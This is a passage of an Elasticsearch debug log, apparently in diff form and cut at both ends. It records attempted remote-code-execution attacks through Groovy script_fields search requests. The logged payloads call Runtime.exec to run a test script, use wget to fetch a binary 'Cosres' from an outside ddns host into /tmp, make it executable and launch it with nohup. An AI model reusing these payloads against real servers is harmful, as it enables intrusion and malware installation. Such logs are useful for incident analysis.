+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 21:29:54,677][DEBUG][action.search.type       ] [Orb] [product][3], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@74fe8977] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"./tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2494.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 227.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 21:29:54,678][DEBUG][action.search.type       ] [Orb] [product][4], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@74fe8977]
+org.elasticsearch.search.SearchParseException: [product][4]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"./tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2493.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 227.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 21:29:54,678][DEBUG][action.search.type       ] [Orb] All shards failed for phase: [query]
+[2014-12-21 22:11:34,635][DEBUG][action.search.type       ] [Orb] [product][0], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2113bfac] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][0]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2496.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 261.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:11:34,636][DEBUG][action.search.type       ] [Orb] [product][2], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2113bfac] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][2]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2500.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 261.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:11:34,637][DEBUG][action.search.type       ] [Orb] [product][3], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2113bfac] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2499.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 261.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:11:34,638][DEBUG][action.search.type       ] [Orb] [product][4], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2113bfac] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][4]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2498.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 261.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:11:34,639][DEBUG][action.search.type       ] [Orb] [product][1], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2113bfac]
+org.elasticsearch.search.SearchParseException: [product][1]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2497.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 261.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:11:34,639][DEBUG][action.search.type       ] [Orb] All shards failed for phase: [query]
+[2014-12-21 22:58:26,810][DEBUG][action.search.type       ] [Orb] [product][2], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@21f3ee79] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][2]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2501.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 235.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:58:26,811][DEBUG][action.search.type       ] [Orb] [product][3], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@21f3ee79] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2505.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 235.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:58:26,812][DEBUG][action.search.type       ] [Orb] [product][4], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@21f3ee79] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][4]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2504.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 235.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:58:26,813][DEBUG][action.search.type       ] [Orb] [product][1], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@21f3ee79] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][1]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2503.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 235.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:58:26,815][DEBUG][action.search.type       ] [Orb] [product][0], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@21f3ee79]
+org.elasticsearch.search.SearchParseException: [product][0]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2502.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 235.
+   Line())!=null){sb.append(str "
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 22:58:26,815][DEBUG][action.search.type       ] [Orb] All shards failed for phase: [query]
+[2014-12-21 23:28:56,784][DEBUG][action.search.type       ] [Orb] [product][0], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@555bffd2] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][0]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"nohup /tmp/Cosres\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
